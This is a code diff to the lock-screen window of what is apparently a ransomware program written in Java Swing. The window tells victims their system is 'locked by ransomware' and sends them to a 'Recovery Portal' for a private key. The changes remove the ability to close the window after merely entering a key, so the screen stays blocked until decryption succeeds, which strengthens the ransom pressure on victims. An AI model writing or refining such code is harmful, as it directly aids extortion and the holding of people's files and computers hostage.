@@ -83,14 +83,13 @@ public final class LockScreen {
         frame.addWindowListener(new java.awt.event.WindowAdapter() {
             @Override
             public void windowClosing(java.awt.event.WindowEvent e) {
-                boolean hasKey = privateKeyField != null && !privateKeyField.getText().trim().isEmpty();
-                if (isDecrypted || hasKey) {
+                if (isDecrypted) {
                     closeWindow();
                 } else {
                     JOptionPane.showMessageDialog(frame,
                         "Cannot close: System is locked by ransomware.\n" +
-                        "Please obtain your Private Key from the Recovery Portal\n" +
-                        "and enter it into the key field to unlock closing.",
+                        "You must enter your Private Key and click [Decrypt]\n" +
+                        "to successfully restore your files before closing this window.",
                         "Action Blocked — System Locked",
                         JOptionPane.WARNING_MESSAGE);
                 }
@@ -406,17 +405,20 @@ public final class LockScreen {
 
         privateKeyField.getDocument().addDocumentListener(new javax.swing.event.DocumentListener() {
             private void update() {
-                boolean hasKey = !privateKeyField.getText().trim().isEmpty();
-                if (hasKey || isDecrypted) {
+                if (isDecrypted) {
                     frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                     if (closeButton != null) closeButton.setEnabled(true);
-                    statusMessageLabel.setText("Private Key entered. You may now [Decrypt] or close this window.");
-                    statusMessageLabel.setForeground(new Color(120, 230, 255));
                 } else {
                     frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
                     if (closeButton != null) closeButton.setEnabled(false);
-                    statusMessageLabel.setText("Ready. Obtain key from Recovery Portal and click [Decrypt].");
-                    statusMessageLabel.setForeground(new Color(255, 230, 150));
+                    boolean hasKey = !privateKeyField.getText().trim().isEmpty();
+                    if (hasKey) {
+                        statusMessageLabel.setText("Private Key entered. Click [Decrypt] to verify key and restore files.");
+                        statusMessageLabel.setForeground(new Color(120, 230, 255));
+                    } else {
+                        statusMessageLabel.setText("Ready. Obtain key from Recovery Portal and click [Decrypt].");
+                        statusMessageLabel.setForeground(new Color(255, 230, 150));
+                    }
                 }
             }
             @Override public void insertUpdate(javax.swing.event.DocumentEvent e) { update(); }
@@ -432,7 +434,8 @@ public final class LockScreen {
                     .getSystemClipboard().getData(java.awt.datatransfer.DataFlavor.stringFlavor);
                 if (clipboard != null) {
                     privateKeyField.setText(clipboard.trim());
-                    statusMessageLabel.setText("Private Key pasted. Window close is now unlocked.");
+                    statusMessageLabel.setText("Private Key pasted. Click [Decrypt] to verify and restore files.");
+                    statusMessageLabel.setForeground(new Color(120, 230, 255));
                 }
             } catch (Exception ex) {
                 statusMessageLabel.setText("Unable to paste from clipboard.");
@@ -503,10 +506,9 @@ public final class LockScreen {
         closeButton = new JButton("Close Window");
         styleActionButton(closeButton, new Color(75, 75, 75), Color.WHITE);
         closeButton.setEnabled(false);
-        closeButton.setToolTipText("Available once Private Key is entered or files are decrypted");
+        closeButton.setToolTipText("Available once files are successfully decrypted");
         closeButton.addActionListener(e -> {
-            boolean hasKey = !privateKeyField.getText().trim().isEmpty();
-            if (isDecrypted || hasKey) {
+            if (isDecrypted) {
                 closeWindow();
             }
         });
